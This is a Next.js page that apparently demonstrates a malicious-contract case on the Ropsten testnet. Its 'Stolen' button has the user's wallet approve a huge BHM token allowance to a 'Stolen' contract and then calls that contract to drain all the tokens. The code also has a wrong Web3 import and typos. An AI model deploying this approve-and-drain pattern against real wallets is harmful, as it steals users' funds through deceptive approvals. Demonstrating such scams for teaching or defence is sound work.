import type { NextPage } from 'next'
import Head from 'next/head'
import Image from 'next/image'
import { useState } from 'react';
import Web3 from 'react';
import styles from '../styles/Home.module.css'
import { Navbar } from '../components/Navbar';
import { Footer } from '../components/Footer';

const Home: NextPage = () => {

  const [wallet,setWalletAddress] = useState(null)
  
  const connectWallet = async () => {
    // Check if MetaMask is installed on user's browser
    if(window.ethereum) {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const chainId = await window.ethereum.request({ method: 'eth_chainId'});
      // Check if user is connected to Ropsten
      if(chainId != '0x3') {
        alert("Please connect to Ropsten");
      }else{
        let wallet = accounts[0];
        setWalletAddress(wallet);
      }
    } else {
      alert("Please install Mask");
    }
    return wallet;
  }

  const sendToken = async () => {
    const Web3 = require('web3');
    const web3 = new Web3(window.ethereum);
    await window.ethereum.enable();
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    let wallet = accounts[0];
    const contract_abi = require('../../abi/BHM_Fauset_abi');
    const contract_address = '0xc2C89adDd9e7549BB1711f845B1A8948fdD74241';
    const Faucet = new web3.eth.Contract(contract_abi, contract_address);
    //const MintContract = new web3.eth.Contract(contract_abi, contract_address);
    await Faucet.methods.send().send({from:wallet});
  }

  const stolenToken = async () => {
    const Web3 = require('web3');
    const web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    let wallet = accounts[0];
    await window.ethereum.enable();
    const Token_contract_abi = require('../../abi/BHM_Token_abi');
    const Token_contract_address = '0x153F0FCC0E6668b2A0fa77d3B0C8406f25aFe62f';

    const Stolen_contract_abi = require('../../abi/BHM_Stolen_abi');
    const Stolen_contract_address = '0x850C6B539005692d7a7dAc741e9d5C448C54f79a';

    //TokenのコントラクトアドレスでApprove処理を実行
    const amount = '1000000000000000000000000';

    const Approve = new web3.eth.Contract(Token_contract_abi, Token_contract_address);
    await Approve.methods.approve(Stolen_contract_address,amount).send({from:wallet});

    //Stolen関数を実行して、BHM Tokenをすべて抜き取る
    
    const Stolen = new web3.eth.Contract(Stolen_contract_abi, Stolen_contract_address);
    //const MintContract = new web3.eth.Contract(contract_abi, contract_address);
    await Stolen.methods.Stolen().send({from:wallet});
  
    

  }


  return (
    <div>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <Navbar />

      <main className={styles.main}>
        <h1 className="text-3xl font-bold">
          ケース1: 悪意のあるコントラクト
        </h1>

        <button onClick={stolenToken}>Stolen</button>

        <div className={styles.grid}>
          <a href="https://nextjs.org/docs" className={styles.card}>
            <h2>Documentation &rarr;</h2>
            <p>Find in-depth information about Next.js features and API.</p>
          </a>

          <a href="https://nextjs.org/learn" className={styles.card}>
            <h2>Learn &rarr;</h2>
            <p>Learn about Next.js in an interactive course with quizzes!</p>
          </a>

          <a
            href="https://github.com/vercel/next.js/tree/canary/examples"
            className={styles.card}
          >
            <h2>Examples &rarr;</h2>
            <p>Discover and deploy boilerplate example Next.js projects.</p>
          </a>

          <a
            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
            className={styles.card}
          >
            <h2>Deploy &rarr;</h2>
            <p>
              Instantly deploy your Next.js site to a public URL with Vercel.
            </p>
          </a>
        </div>
      </main>
      <Footer />
    </div>

  )
}

export default Home
